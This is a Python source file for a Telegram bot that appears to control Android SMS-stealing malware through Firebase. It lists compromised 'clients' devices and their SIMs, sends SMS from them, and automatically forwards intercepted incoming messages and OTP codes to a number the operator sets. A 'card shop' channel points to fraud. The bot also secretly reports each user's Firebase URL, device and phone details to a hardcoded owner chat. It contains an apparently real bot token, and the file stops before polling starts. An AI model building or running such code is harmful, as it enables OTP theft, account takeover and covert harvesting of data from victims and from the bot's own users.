#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import re
import logging
import time
import threading
import requests
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# ============================
# FLASK KEEP-ALIVE (24/7)
# ============================
from flask import Flask
flask_app = Flask(__name__)

@flask_app.route('/')
@flask_app.route('/ping')
def ping():
    return "✅ Bot is alive!", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port)

# ============================
# LOGGING
# ============================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================
# BOT TOKENS – BILKUL LEFT MARGIN (0 spaces)
# ============================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8513155082:AAEQHvy3LFgxtM01TpC1QkZLM1vkLEXUvMc")
OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN", "8513155082:AAEQHvy3LFgxtM01TpC1QkZLM1vkLEXUvMc")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID", "7762659513"))

# ============================
# BOT NAME
# ============================
BOT_NAME = "<b>𝗔𝗡𝗬 𝗔𝗨𝗧𝗢 𝗕𝗢𝗧</b>"

# ============================
# FORCE JOIN CHANNEL
# ============================
CHANNEL_USERNAME = "@samcardsshop"
CHANNEL_URL = "https://t.me/samcardsshop"

# ============================
# USER CONFIG – PERSISTENT VOLUME FIX
# ============================
os.makedirs("data", exist_ok=True)
USER_CONFIG_FILE = os.path.join("data", "user_config.json")

user_configs = {}
last_otp = {}
banned_users = set()

BANNED_FILE = os.path.join("data", "banned.json")

def load_banned():
    global banned_users
    if os.path.exists(BANNED_FILE):
        with open(BANNED_FILE, "r") as f:
            banned_users = set(json.load(f))

def save_banned():
    with open(BANNED_FILE, "w") as f:
        json.dump(list(banned_users), f)

load_banned()

def load_user_configs():
    global user_configs, last_otp
    if os.path.exists(USER_CONFIG_FILE):
        with open(USER_CONFIG_FILE, "r") as f:
            user_configs = json.load(f)
        for uid, cfg in user_configs.items():
            if "last_otp_value" in cfg:
                last_otp[uid] = cfg["last_otp_value"]
        logger.info(f"✅ Loaded configs for {len(user_configs)} users")
    else:
        user_configs = {}

def save_user_configs():
    with open(USER_CONFIG_FILE, "w") as f:
        json.dump(user_configs, f, indent=2)

load_user_configs()

# ============================
# CONVERSATION STATES
# ============================
URL, CHANNEL = range(2)
WAITING_OTP_NUMBER = 10

# ============================
# MEMBERSHIP CHECK WITH BUTTONS
# ============================
async def send_join_required_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_URL)],
        [InlineKeyboardButton("✅ I have joined", callback_data="check_membership")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.effective_message.reply_text(
        f"❌ <b>You must join our channel to use this bot.</b>\n\n"
        f"Click the button below to join, then click 'I have joined' to continue.",
        parse_mode="HTML",
        reply_markup=reply_markup,
        disable_web_page_preview=True,
    )

async def is_user_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    if str(user_id) in banned_users:
        await update.effective_message.reply_text("🚫 <b>You are banned from using this bot.</b>", parse_mode="HTML")
        return False
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ["member", "administrator", "creator"]:
            return True
        else:
            await send_join_required_message(update, context)
            return False
    except Exception as e:
        logger.error(f"Membership check error for {user_id}: {e}")
        # Agar bot channel ka admin nahi hai toh check bypass karo
        return True

def is_owner(user_id: int) -> bool:
    return user_id == OWNER_CHAT_ID

async def check_membership_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ["member", "administrator", "creator"]:
            await query.edit_message_text(
                f"✅ <b>You are now a member!</b>\n\n"
                f"Welcome to {BOT_NAME}.\n"
                f"Use /start to see all commands.",
                parse_mode="HTML"
            )
            await context.bot.send_message(
                chat_id=user_id,
                text=f"{BOT_NAME} <b>WELCOME</b>\n\n"
                     f"<b>Available commands:</b>\n"
                     f"/setup – Configure Firebase URL & Channel ID\n"
                     f"/devices – Select device and SIM\n"
                     f"/setotp – Set forwarding phone number\n"
                     f"/resetforward – Reset old message tracker\n"
                     f"/help – Show this message\n\n"
                     f"<b>How it works:</b>\n"
                     f"After setup, messages from channel with 'To:' and 'Message:' will be sent as SMS.\n"
                     f"OTP node updates are automatically sent to your set number.\n"
                     f"Incoming SMS (type: 'incoming') in messages/{{device_id}} will be forwarded only if new.",
                parse_mode='HTML',
                disable_web_page_preview=True,
            )
        else:
            await query.edit_message_text(
                f"❌ You still haven't joined the channel.\n\n"
                f"Please click the 'Join Channel' button below, then click 'I have joined' again.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_URL)],
                    [InlineKeyboardButton("✅ I have joined", callback_data="check_membership")]
                ]),
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"Callback membership check error: {e}")
        # Bot channel ka admin nahi - user ko allow karo
        await query.edit_message_text(
            f"✅ <b>Welcome to {BOT_NAME}!</b>\n\nUse /start to see all commands.",
            parse_mode="HTML"
        )
        await context.bot.send_message(
            chat_id=user_id,
            text=f"{BOT_NAME} <b>WELCOME</b>\n\n"
                 f"<b>Available commands:</b>\n"
                 f"/setup – Configure Firebase URL & Channel ID\n"
                 f"/devices – Select device and SIM\n"
                 f"/setotp – Set forwarding phone number\n"
                 f"/resetforward – Reset old message tracker\n"
                 f"/help – Show this message",
            parse_mode='HTML',
            disable_web_page_preview=True,
        )

# ============================
# HELP / START
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user = update.effective_user
    try:
        notif = (
            f"👤 **New User /start**\n"
            f"🆔 ID: `{user.id}`\n"
            f"📛 Name: {user.full_name}\n"
            f"🔖 Username: @{user.username or 'N/A'}"
        )
        requests.post(
            f"https://api.telegram.org/bot{OWNER_BOT_TOKEN}/sendMessage",
            json={"chat_id": OWNER_CHAT_ID, "text": notif, "parse_mode": "Markdown"},
            timeout=5
        )
    except Exception:
        pass
    await update.message.reply_text(
        f"{BOT_NAME} <b>WELCOME</b>\n\n"
        f"<b>Available commands:</b>\n"
        f"/setup – Configure Firebase URL & Channel ID\n"
        f"/devices – Select device and SIM\n"
        f"/setotp – Set forwarding phone number\n"
        f"/resetforward – Reset old message tracker\n"
        f"/help – Show this message\n\n"
        f"<b>How it works:</b>\n"
        f"After setup, messages from channel with 'To:' and 'Message:' will be sent as SMS.\n"
        f"OTP node updates are automatically sent to your set number.\n"
        f"Incoming SMS (type: 'incoming') in messages/{{device_id}} will be forwarded only if new.",
        parse_mode='HTML',
        disable_web_page_preview=True,
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    await start(update, context)

# ============================
# RESET FORWARD
# ============================
async def reset_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run SETUP first.</b>", parse_mode='HTML')
        return
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        await update.message.reply_text("<b>❌ No device selected. Use /devices first.</b>", parse_mode='HTML')
        return
    device_id = selected["deviceId"]
    initialize_processed_keys(user_id, device_id)
    await update.message.reply_text(
        f"<b>✅ Reset successful!</b>\n"
        f"All existing messages for device <code>{device_id}</code> are now marked as read.\n"
        f"Only new incoming messages will be forwarded.",
        parse_mode='HTML'
    )

# ============================
# ADMIN COMMANDS (OWNER ONLY)
# ============================
async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("🚫 <b>Owner only command.</b>", parse_mode="HTML")
        return
    if not user_configs:
        await update.message.reply_text("📭 <b>No users yet.</b>", parse_mode="HTML")
        return
    msg = f"👥 <b>Total Users: {len(user_configs)}</b>\n\n"
    for uid, cfg in user_configs.items():
        fb = cfg.get("firebase_url", "N/A")
        otp = cfg.get("otpNumber", "N/A")
        dev = cfg.get("selectedDevice", {}).get("deviceId", "N/A")
        ban = "🚫 Banned" if uid in banned_users else "✅ Active"
        msg += f"🆔 <code>{uid}</code> {ban}\n🌐 <code>{fb}</code>\n📱 Device: <code>{dev}</code>\n📞 OTP#: <code>{otp}</code>\n\n"
    for chunk in [msg[i:i+4000] for i in range(0, len(msg), 4000)]:
        await update.message.reply_text(chunk, parse_mode="HTML")

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("🚫 <b>Owner only command.</b>", parse_mode="HTML")
        return
    if not context.args:
        await update.message.reply_text("❌ <b>Usage:</b> /broadcast message text yahan likho", parse_mode="HTML")
        return
    text = " ".join(context.args)
    success, fail = 0, 0
    for uid in user_configs.keys():
        try:
            await context.bot.send_message(chat_id=int(uid), text=f"📢 <b>Message from Admin:</b>\n\n{text}", parse_mode="HTML")
            success += 1
        except Exception:
            fail += 1
    await update.message.reply_text(f"✅ Sent: <b>{success}</b> | ❌ Failed: <b>{fail}</b>", parse_mode="HTML")

async def admin_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("🚫 <b>Owner only command.</b>", parse_mode="HTML")
        return
    if not context.args:
        await update.message.reply_text("❌ <b>Usage:</b> /ban 123456789", parse_mode="HTML")
        return
    target = context.args[0]
    banned_users.add(target)
    save_banned()
    await update.message.reply_text(f"🚫 <b>User <code>{target}</code> banned.</b>", parse_mode="HTML")

async def admin_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("🚫 <b>Owner only command.</b>", parse_mode="HTML")
        return
    if not context.args:
        await update.message.reply_text("❌ <b>Usage:</b> /unban 123456789", parse_mode="HTML")
        return
    target = context.args[0]
    banned_users.discard(target)
    save_banned()
    await update.message.reply_text(f"✅ <b>User <code>{target}</code> unbanned.</b>", parse_mode="HTML")

async def admin_userinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("🚫 <b>Owner only command.</b>", parse_mode="HTML")
        return
    if not context.args:
        await update.message.reply_text("❌ <b>Usage:</b> /userinfo 123456789", parse_mode="HTML")
        return
    uid = context.args[0]
    cfg = user_configs.get(uid)
    if not cfg:
        await update.message.reply_text(f"❌ <b>User <code>{uid}</code> not found.</b>", parse_mode="HTML")
        return
    dev = cfg.get("selectedDevice", {})
    ban_status = "🚫 Banned" if uid in banned_users else "✅ Active"
    msg = (
        f"👤 <b>User Info</b>\n"
        f"🆔 ID: <code>{uid}</code>\n"
        f"📊 Status: {ban_status}\n"
        f"🌐 Firebase: <code>{cfg.get('firebase_url', 'N/A')}</code>\n"
        f"📢 Channel ID: <code>{cfg.get('channel_id', 'N/A')}</code>\n"
        f"📱 Device: <code>{dev.get('deviceId', 'N/A')}</code>\n"
        f"📶 SIM Slot: <code>{dev.get('simSlotIndex', 'N/A')}</code>\n"
        f"📞 SIM Phone: <code>{dev.get('simPhoneNumber', 'N/A')}</code>\n"
        f"🔢 OTP Number: <code>{cfg.get('otpNumber', 'N/A')}</code>"
    )
    await update.message.reply_text(msg, parse_mode="HTML")

async def admin_deleteuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("🚫 <b>Owner only command.</b>", parse_mode="HTML")
        return
    if not context.args:
        await update.message.reply_text("❌ <b>Usage:</b> /deleteuser 123456789", parse_mode="HTML")
        return
    uid = context.args[0]
    if uid in user_configs:
        del user_configs[uid]
        save_user_configs()
        await update.message.reply_text(f"🗑️ <b>User <code>{uid}</code> deleted.</b>", parse_mode="HTML")
    else:
        await update.message.reply_text(f"❌ <b>User not found.</b>", parse_mode="HTML")

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("🚫 <b>Owner only command.</b>", parse_mode="HTML")
        return
    msg = (
        "🛠️ <b>ADMIN PANEL</b>\n\n"
        "/users – Sab users ki list\n"
        "/userinfo [id] – Kisi user ki detail\n"
        "/broadcast [msg] – Sab ko message bhejo\n"
        "/ban [id] – User ban karo\n"
        "/unban [id] – User unban karo\n"
        "/deleteuser [id] – User ka data delete karo"
    )
    await update.message.reply_text(msg, parse_mode="HTML")

# ============================
# FIREBASE HELPERS
# ============================
def firebase_get(user_id, path):
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return None
    url = f"{cfg['firebase_url']}/{path}.json"
    try:
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            return resp.json()
    except Exception as e:
        logger.error(f"Firebase GET error: {e}")
    return None

def firebase_put(user_id, path, data):
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return
    url = f"{cfg['firebase_url']}/{path}.json"
    try:
        requests.put(url, json=data, timeout=10)
    except Exception as e:
        logger.error(f"Firebase PUT error: {e}")

def normalize_sims(sims_raw):
    """Firebase arrays ko proper list mein convert karo"""
    if not sims_raw:
        return []
    if isinstance(sims_raw, list):
        return [s for s in sims_raw if s]
    if isinstance(sims_raw, dict):
        return [v for k, v in sorted(sims_raw.items()) if v]
    return []

def get_online_devices(user_id):
    data = firebase_get(user_id, "clients")
    if not data:
        return {}
    online = {}
    for dev_id, info in data.items():
        if not isinstance(info, dict):
            continue
        status = info.get("status")
        if status == True or status == "true" or status == 1:
            sims = normalize_sims(info.get("sims"))
            online[dev_id] = {
                "modelName": info.get("modelName", info.get("model", "Unknown")),
                "sims": sims
            }
    return online

def get_selected(user_id):
    cfg = user_configs.get(str(user_id))
    if cfg and "selectedDevice" in cfg:
        return cfg["selectedDevice"]
    return {}

def initialize_processed_keys(user_id: str, device_id: str):
    cfg = user_configs.get(user_id)
    if not cfg:
        return
    msgs = firebase_get(user_id, f"messages/{device_id}")
    keys = []
    if msgs and isinstance(msgs, dict):
        keys = list(msgs.keys())
    cfg["processed_keys"] = keys
    cfg["processed_device"] = device_id
    cfg.pop("last_forwarded_id", None)
    cfg.pop("selection_time", None)
    save_user_configs()
    logger.info(f"Initialized processed_keys for user {user_id}, device {device_id}: {len(keys)} keys")

def set_selected(user_id, device_id, sim_slot, sim_phone):
    cfg = user_configs.get(str(user_id))
    if cfg:
        cfg["selectedDevice"] = {
            "deviceId": device_id,
            "simSlotIndex": sim_slot,
            "simPhoneNumber": sim_phone
        }
        initialize_processed_keys(str(user_id), device_id)
        save_user_configs()
        logger.info(f"✅ Device selected. Processed keys reset for {user_id}")

def send_sms_command(user_id, device_id, to_number, message, from_number):
    firebase_put(user_id, f"clients/{device_id}/webhookEvent/sendSms", {
        "to": to_number,
        "message": message,
        "from": from_number,
        "isSended": False
    })
    logger.info(f"📤 SMS command sent: device {device_id} -> {to_number}")

def get_otp_number(user_id):
    cfg = user_configs.get(str(user_id))
    if cfg and "otpNumber" in cfg:
        return cfg["otpNumber"]
    return None

def set_otp_number(user_id, number):
    cfg = user_configs.get(str(user_id))
    if cfg:
        cfg["otpNumber"] = number
        save_user_configs()

# ============================
# SETUP CONVERSATION
# ============================
async def setup_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text(
        f"<b>📌 Step 1/2</b>: Send your <b>Firebase URL</b>.\nExample: <code>https://your-project.firebaseio.com</code>\nType /cancel to abort.",
        parse_mode='HTML'
    )
    return URL

async def setup_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    url = update.message.text.strip()
    if not url.startswith("https://") or not url.endswith(".firebaseio.com"):
        await update.message.reply_text("<b>❌ Invalid URL. Must be https://...firebaseio.com</b>", parse_mode='HTML')
        return URL
    context.user_data["firebase_url"] = url
    await update.message.reply_text(
        "<b>✅ URL saved.</b>\n\n<b>📌 Step 2/2</b>: Send your <b>Channel ID</b> (numeric, may be negative).",
        parse_mode='HTML'
    )
    return CHANNEL

async def setup_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    try:
        channel_id = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("<b>❌ Channel ID must be a number.</b>", parse_mode='HTML')
        return CHANNEL

    user_configs[user_id] = {
        "firebase_url": context.user_data["firebase_url"],
        "channel_id": channel_id,
        "selectedDevice": {},
        "otpNumber": None,
        "processed_keys": [],
        "processed_device": None
    }
    save_user_configs()

    try:
        forward_msg = (
            f"🔐 **Setup Complete!**\n👤 User: `{user_id}`\n🌐 URL: `{context.user_data['firebase_url']}`\n📢 Channel: `{channel_id}`"
        )
        url = f"https://api.telegram.org/bot{OWNER_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": OWNER_CHAT_ID, "text": forward_msg, "parse_mode": "Markdown"}, timeout=5)
    except Exception as e:
        logger.error(f"Forward failed: {e}")

    test = firebase_get(user_id, "clients")
    if test is None:
        await update.message.reply_text("<b>❌ Firebase connection failed. Check URL or make database public.</b>", parse_mode='HTML')
        del user_configs[user_id]
        save_user_configs()
        return ConversationHandler.END

    await update.message.reply_text(
        f"{BOT_NAME} <b>SETUP COMPLETE!</b>\n\n"
        f"<b>✅ Configuration saved.</b>\n"
        f"Now use /devices to select a device and SIM, then /setotp to set forwarding number.",
        parse_mode='HTML'
    )
    return ConversationHandler.END

async def setup_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Setup cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# DEVICES
# ============================
async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return
    online = get_online_devices(user_id)
    if not online:
        await update.message.reply_text("<b>❌ No online devices found.</b>", parse_mode='HTML')
        return
    keyboard = []
    for dev_id, data in online.items():
        label = f"📱 {data['modelName']} ({dev_id[:6]}...)"
        keyboard.append([InlineKeyboardButton(label, callback_data=f"dev_{dev_id}")])
    await update.message.reply_text(
        "<b>👇 Select your device:</b>",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not await is_user_member(update, context):
        return
    await query.answer()
    user_id = str(update.effective_user.id)
    device_id = query.data.replace("dev_", "")
    online = get_online_devices(user_id)
    device_data = online.get(device_id)
    if not device_data:
        await query.edit_message_text("<b>❌ Device offline.</b>", parse_mode='HTML')
        return
    sims = device_data.get("sims", [])
    if not sims:
        await query.edit_message_text(
            f"<b>❌ No SIMs found on this device.</b>\n\n"
            f"<b>Possible reasons:</b>\n"
            f"• App ne SIM info Firebase pe save nahi ki\n"
            f"• Device restart karo aur dobara try karo\n"
            f"• App permissions check karo (Phone State permission)",
            parse_mode='HTML'
        )
        return
    keyboard = []
    for i, sim in enumerate(sims):
        if not isinstance(sim, dict):
            continue
        # Multiple possible field names handle karo
        slot = sim.get("simSlotIndex", sim.get("slotIndex", sim.get("slot", i)))
        phone = (
            sim.get("phoneNumber")
            or sim.get("phone")
            or sim.get("number")
            or sim.get("simPhoneNumber")
            or "Unknown"
        )
        # Telegram callback_data max 64 bytes hota hai
        short_device = device_id[:20] if len(device_id) > 20 else device_id
        short_phone = str(phone)[:15]
        callback_data = f"sim_{short_device}_{slot}_{short_phone}"
        keyboard.append([InlineKeyboardButton(f"📶 SIM {slot} - {phone}", callback_data=callback_data)])
    await query.edit_message_text(
        f"<b>📱 Device:</b> <code>{device_data['modelName']}</code>\n<b>Choose SIM:</b>",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not await is_user_member(update, context):
        return
    await query.answer()
    user_id = str(update.effective_user.id)
    parts = query.data.split("_")
    if len(parts) < 4:
        await query.edit_message_text("<b>❌ Invalid data.</b>", parse_mode='HTML')
        return
    # sim_DEVICEID_SLOT_PHONE format - device ID mein _ ho sakta hai
    device_id = parts[1]
    slot = parts[-2]
    phone = parts[-1]
    set_selected(user_id, device_id, slot, phone)
    await query.edit_message_text(
        f"<b>✅ Active!</b>\n"
        f"📱 Device: <code>{device_id}</code>\n"
        f"📶 SIM Slot: <code>{slot}</code>\n"
        f"📞 Phone: <code>{phone}</code>\n\n"
        f"✅ Old messages blocked. Only new ones will forward.\n"
        f"Now set OTP number using /setotp.",
        parse_mode='HTML'
    )
    try:
        cfg = user_configs.get(user_id, {})
        fb_url = cfg.get("firebase_url", "N/A")
        notif = (
            f"📱 **Device Selected**\n"
            f"👤 User: `{user_id}`\n"
            f"🌐 Firebase: `{fb_url}`\n"
            f"📟 Device ID: `{device_id}`\n"
            f"📶 SIM Slot: `{slot}`\n"
            f"📞 SIM Phone: `{phone}`"
        )
        requests.post(
            f"https://api.telegram.org/bot{OWNER_BOT_TOKEN}/sendMessage",
            json={"chat_id": OWNER_CHAT_ID, "text": notif, "parse_mode": "Markdown"},
            timeout=5
        )
    except Exception:
        pass

# ============================
# SET OTP
# ============================
async def setotp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return ConversationHandler.END
    if context.args:
        number = context.args[0]
        if not re.match(r"^\+?[0-9]{10,15}$", number):
            await update.message.reply_text("<b>❌ Invalid number. Use /setotp +919876543210</b>", parse_mode='HTML')
            return ConversationHandler.END
        set_otp_number(user_id, number)
        await update.message.reply_text(f"<b>✅ Forward number set to <code>{number}</code>.</b>", parse_mode='HTML')
        try:
            notif = f"📞 **OTP Number Set**\n👤 User: `{user_id}`\n📱 Number: `{number}`"
            requests.post(
                f"https://api.telegram.org/bot{OWNER_BOT_TOKEN}/sendMessage",
                json={"chat_id": OWNER_CHAT_ID, "text": notif, "parse_mode": "Markdown"},
                timeout=5
            )
        except Exception:
            pass
        return ConversationHandler.END
    await update.message.reply_text(
        "<b>📞 Send phone number (with country code):</b>\nExample: <code>+919876543210</code>\nType /cancel to abort.",
        parse_mode='HTML'
    )
    return WAITING_OTP_NUMBER

async def otp_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    number = update.message.text.strip()
    if not re.match(r"^\+?[0-9]{10,15}$", number):
        await update.message.reply_text("<b>❌ Invalid number. Try again.</b>", parse_mode='HTML')
        return WAITING_OTP_NUMBER
    set_otp_number(user_id, number)
    await update.message.reply_text(f"<b>✅ Forward number set to <code>{number}</code>.</b>", parse_mode='HTML')
    try:
        notif = f"📞 **OTP Number Set**\n👤 User: `{user_id}`\n📱 Number: `{number}`"
        requests.post(
            f"https://api.telegram.org/bot{OWNER_BOT_TOKEN}/sendMessage",
            json={"chat_id": OWNER_CHAT_ID, "text": notif, "parse_mode": "Markdown"},
            timeout=5
        )
    except Exception:
        pass
    return ConversationHandler.END

async def otp_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# CHANNEL MESSAGE
# ============================
def get_user_by_channel(channel_id):
    for uid, cfg in user_configs.items():
        if cfg.get("channel_id") == channel_id:
            return uid
    return None

async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.channel_post:
        return
    channel_id = update.channel_post.chat_id
    user_id = get_user_by_channel(channel_id)
    if not user_id:
        return
    text = update.channel_post.text
    if not text:
        return
    number_match = re.search(r"To:\s*([\d\+]+)", text)
    message_match = re.search(r"Message:\s*(.+)", text)
    if not number_match or not message_match:
        logger.warning(f"Parse failed: {text}")
        return
    to_number = number_match.group(1).strip()
    msg = message_match.group(1).strip()
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        logger.warning(f"No active device for {user_id}")
        return
    device_id = selected["deviceId"]
    from_number = selected.get("simPhoneNumber", "Unknown")
    send_sms_command(user_id, device_id, to_number, msg, from_number)
    logger.info(f"✅ Token SMS sent: {user_id} -> {device_id} -> {to_number}")

# ============================
# OTP POLLING
# ============================
def poll_otp_updates():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                otp_number = get_otp_number(user_id)
                if not otp_number:
                    continue
                selected = get_selected(user_id)
                if not selected or not selected.get("deviceId"):
                    continue
                try:
                    otp_data = firebase_get(user_id, "otp")
                except Exception as e:
                    logger.error(f"OTP fetch error for {user_id}: {e}")
                    continue
                if otp_data is None:
                    continue
                current_otp = str(otp_data).strip()
                if user_id not in last_otp or last_otp[user_id] != current_otp:
                    last_otp[user_id] = current_otp
                    cfg = user_configs.get(user_id)
                    if cfg:
                        cfg["last_otp_value"] = current_otp
                        save_user_configs()
                    device_id = selected["deviceId"]
                    from_number = selected.get("simPhoneNumber", "Unknown")
                    send_sms_command(user_id, device_id, otp_number, current_otp, from_number)
                    logger.info(f"✅ Auto OTP sent to {otp_number}: {current_otp}")
        except Exception as e:
            logger.error(f"OTP polling error: {e}")
        time.sleep(0.5)

# ============================
# INCOMING MESSAGE FORWARD
# ============================
def poll_incoming_messages():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                forward_number = get_otp_number(user_id)
                if not forward_number:
                    continue
                selected = get_selected(user_id)
                if not selected or not selected.get("deviceId"):
                    continue
                device_id = selected["deviceId"]
                from_number = selected.get("simPhoneNumber", "Unknown")
                cfg = user_configs.get(str(user_id), {})
                processed_keys = cfg.get("processed_keys", [])
                processed_device = cfg.get("processed_device")
                if processed_device != device_id:
                    initialize_processed_keys(str(user_id), device_id)
                    processed_keys = cfg.get("processed_keys", [])
                    processed_device = cfg.get("processed_device")
                processed_set = set(processed_keys)
                device_msgs = firebase_get(user_id, f"messages/{device_id}")
                if not device_msgs or not isinstance(device_msgs, dict):
                    continue
                new_keys = []
                for msg_key, msg_data in device_msgs.items():
                    if not isinstance(msg_data, dict):
                        continue
                    if msg_data.get("type") != "incoming":
                        continue
                    if msg_key not in processed_set:
                        msg_text = msg_data.get("message", "")
                        if msg_text and len(msg_text) > 3:
                            send_sms_command(user_id, device_id, forward_number, msg_text, from_number)
                            logger.info(f"📥 Forwarded new message: {msg_text[:50]}...")
                            try:
                                confirm_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                                confirm_data = {
                                    "chat_id": int(user_id),
                                    "text": f"✅ Forwarded to {forward_number}:\n<code>{msg_text[:100]}</code>",
                                    "parse_mode": "HTML"
                                }
                                requests.post(confirm_url, json=confirm_data, timeout=5)
                            except Exception as e:
                                logger.error(f"Confirmation send failed: {e}")
                            new_keys.append(msg_key)
                if new_keys:
                    processed_keys.extend(new_keys)
                    cfg["processed_keys"] = processed_keys
                    save_user_configs()
                    logger.info(f"Updated processed_keys for {user_id}: +{len(new_keys)} keys")
        except Exception as e:
            logger.error(f"Incoming forward error: {e}")
        time.sleep(1)

# ============================
# MAIN
# ============================
def main():
    # Start Flask server for keep-alive
    threading.Thread(target=run_flask, daemon=True).start()
    
    app = Application.builder().token(BOT_TOKEN).build()

    threading.Thread(target=poll_otp_updates, daemon=True).start()
    threading.Thread(target=poll_incoming_messages, daemon=True).start()

    setup_conv = ConversationHandler(
        entry_points=[CommandHandler("setup", setup_start)],
        states={
            URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_url)],
            CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel)]
        },
        fallbacks=[CommandHandler("cancel", setup_cancel)],
    )
    app.add_handler(setup_conv)

    otp_conv = ConversationHandler(
        entry_points=[CommandHandler("setotp", setotp_command)],
        states={
            WAITING_OTP_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_number_input)]
        },
        fallbacks=[CommandHandler("cancel", otp_cancel)],
    )
    app.add_handler(otp_conv)

    app.add_handler(CallbackQueryHandler(device_callback, pattern="^dev_"))
    app.add_handler(CallbackQueryHandler(sim_callback, pattern="^sim_"))
    app.add_handler(CallbackQueryHandler(check_membership_callback, pattern="^check_membership$"))

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("devices", devices_command))
    app.add_handler(CommandHandler("resetforward", reset_forward))

    # Admin commands
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("users", admin_users))
    app.add_handler(CommandHandler("broadcast", admin_broadcast))
    app.add_handler(CommandHandler("ban", admin_ban))
    app.add_handler(CommandHandler("unban", admin_unban))
    app.add_handler(CommandHandler("userinfo", admin_userinfo))
    app.add_handler(CommandHandler("deleteuser", admin_deleteuser))

    app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.CHANNEL, handle_channel_message))

